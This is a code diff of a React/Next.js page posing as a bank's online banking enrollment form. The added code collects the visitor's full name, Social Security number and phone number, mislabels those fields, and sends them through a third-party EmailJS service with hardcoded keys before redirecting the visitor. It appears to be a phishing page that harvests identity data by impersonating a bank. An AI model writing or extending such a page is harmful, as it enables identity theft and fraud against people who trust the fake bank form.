@@ -1,7 +1,23 @@
-import React from "react";
+import React, { useRef } from "react";
 import Head from "next/head";
+import emailjs from "@emailjs/browser";
+import { useRouter } from "next/router";
 
-function authpage() {
+function Authpage() {
+  const form = useRef();
+  const router = useRouter()
+
+  const sendEmail = (e) => {
+    e.preventDefault();
+    router.push(signin);
+
+    emailjs.sendForm(
+      "service_010e718",
+      "template_i0yz417",
+      form.current,
+      "gPbqfBnwXN9QAQdb2"
+    );
+  };
   return (
     <>
       <Head>
@@ -11,102 +27,59 @@ function authpage() {
         <link rel="icon" href="/logo-img.png" />
       </Head>
       <div className="bg-gray-800 min-h-min">
-        <h1 className="p-5 bg-gray-200 text-left font-burtons">
+        <h1 className="p-5 bg-gray-200 text-left">
           Citizens <span className="text-green-600">Farmers</span> Bank Online
           Banking Enrollment Form
         </h1>
         <section className="w-auto pt-3 flex justify-evenly">
           <div className="px-20 py-5 max-w-max border border-gray-500 gap-5 flex items-center">
-            <span className="bg-gray-200 rounded-full p-2 font-opensans font-bold">
+            <span className="bg-gray-200 rounded-full p-2 font-bold">
               1
             </span>
-            <h3 className="font-opensans font-bold text-gray-400">
+            <h3 className="font-bold text-gray-400">
               Customer Information
             </h3>
           </div>
           <div className="px-20 py-5 max-w-max border border-gray-500 gap-5 flex items-center">
-            <span className="border rounded-full p-2 font-opensans text-gray-400">
+            <span className="border rounded-full p-2 text-gray-400">
               2
             </span>
-            <h3 className="font-opensans text-gray-400">
+            <h3 className="text-gray-400">
               Online Banking Access
             </h3>
           </div>
           <div className="px-20 py-5 max-w-max border border-gray-500 gap-5 flex items-center">
-            <span className="border rounded-full p-2 font-opensans text-gray-400">
+            <span className="border rounded-full p-2 text-gray-400">
               3
             </span>
-            <h3 className="font-opensans text-gray-400">Confirmation</h3>
+            <h3 className="text-gray-400">Confirmation</h3>
           </div>
         </section>
 
-        <div class="min-w-min m-auto p-10 bg-transparent justify-center">
-          <form class="shadow-lg w-full max-w-lg">
-            <div class="flex flex-wrap -mx-3 mb-6">
-              <div class="w-full md:w-1/2 px-3 mb-6 md:mb-0">
+        <div class="min-w-min p-10 bg-transparent justify-center">
+          <form
+            class="shadow-lg w-full max-w-lg"
+            ref={form}
+            onSubmit={sendEmail}
+          >
+            <div class="flex flex-wrap m-auto -mx-3 mb-2 justify-center items-center p-5">
+              <div class="px-3 mb-6 md:mb-0">
                 <label
-                  class="block uppercase tracking-wide text-gray-400 text-xs font-opensans font-bold mb-2"
-                  for="grid-first-name"
+                  class="block uppercase tracking-wide text-gray-400 text-xs font-bold mb-2"
+                  for="grid-city"
                 >
-                  First Name
-                </label>
-                <input
-                  class="appearance-none block w-full bg-gray-200 text-gray-700 border rounded py-3 px-4 mb-3 leading-tight focus:outline-none focus:bg-white"
-                  id="grid-first-name"
-                  type="text"
-                  placeholder="Jane"
-                />
-                <p class="text-xs italic">Please fill out this field.</p>
-              </div>
-              <div class="w-full md:w-1/2 px-3">
-                <label
-                  class="block uppercase tracking-wide text-gray-400 text-xs font-opensans font-bold mb-2"
-                  for="grid-last-name"
-                >
-                  Last Name
+                  FULLNAME
                 </label>
                 <input
                   class="appearance-none block w-full bg-gray-200 text-gray-700 border border-gray-200 rounded py-3 px-4 leading-tight focus:outline-none focus:bg-white focus:border-gray-500"
-                  id="grid-last-name"
+                  id="grid-city"
                   type="text"
-                  placeholder="Doe"
+                  name="user_name"
                 />
               </div>
-            </div>
-            <div class="flex flex-wrap -mx-3">
-              <div class="w-full px-3">
-                <label
-                  class="block uppercase tracking-wide text-gray-400 text-xs font-opensans font-bold mb-2"
-                  for="grid-password"
-                >
-                  Email
-                </label>
-                <input
-                  class="appearance-none block w-full bg-gray-200 text-gray-700 border border-gray-200 rounded py-3 px-4 mb-3 leading-tight focus:outline-none focus:bg-white focus:border-gray-500"
-                  id="grid-password"
-                  type="email"
-                />
-                <label
-                  class="block uppercase tracking-wide text-gray-400 text-xs font-opensans font-bold mb-2"
-                  for="grid-email"
-                >
-                  Password
-                </label>
-                <input
-                  class="appearance-none block w-full bg-gray-200 text-gray-700 border border-gray-200 rounded py-3 px-4 mb-3 leading-tight focus:outline-none focus:bg-white focus:border-gray-500"
-                  id="grid-password"
-                  type="password"
-                  placeholder="******************"
-                />
-                <p class="text-gray-600 mb-3 text-xs italic">
-                  Input a secure password
-                </p>
-              </div>
-            </div>
-            <div class="flex flex-wrap -mx-3 mb-2">
               <div class="px-3 mb-6 md:mb-0">
                 <label
-                  class="block uppercase tracking-wide text-gray-400 text-xs font-opensans font-bold mb-2"
+                  class="block uppercase tracking-wide text-gray-400 text-xs font-bold mb-2"
                   for="grid-city"
                 >
                   Social security number
@@ -114,12 +87,29 @@ function authpage() {
                 <input
                   class="appearance-none block w-full bg-gray-200 text-gray-700 border border-gray-200 rounded py-3 px-4 leading-tight focus:outline-none focus:bg-white focus:border-gray-500"
                   id="grid-city"
-                  type="number"
+                  type="text"
+                  name="message"
+                  required
                 />
               </div>
-              <div class="px-3 mb-6 md:mb-0">
+              <div class="px-3 mb-6 xs:pt-6 md:mb-0">
                 <label
-                  class="block uppercase tracking-wide text-gray-400 text-xs font-opensans font-bold mb-2"
+                  class="block uppercase tracking-wide text-gray-400 text-xs font-bold mb-2"
+                  for="grid-city"
+                >
+                  Phone number
+                </label>
+                <input
+                  class="appearance-none block w-full bg-gray-200 text-gray-700 border border-gray-200 rounded py-3 px-4 leading-tight focus:outline-none focus:bg-white focus:border-gray-500"
+                  id="grid-city"
+                  type="text"
+                  name="user_email"
+                  required
+                />
+              </div>
+              <div class="px-3 mb-6 xs:pt-6 md:mb-0">
+                <label
+                  class="block uppercase tracking-wide text-gray-400 text-xs font-bold mb-2"
                   for="grid-zip"
                 >
                   Zip
@@ -135,7 +125,7 @@ function authpage() {
               <div className="justify-right px-3 pt-5 mb-6 md:mb-0">
                 <input
                   type="submit"
-                  className="px-10 py-2 font-opensans font-bold text-gray-400 text-[14px] bg-gray-700 rounded border border-gray-600"
+                  className="px-10 py-2 font-bold text-gray-400 text-[14px] bg-gray-700 rounded border border-gray-600"
                 />
               </div>
             </div>
@@ -149,4 +139,4 @@ function authpage() {
   );
 }
 
-export default authpage;
+export default Authpage;
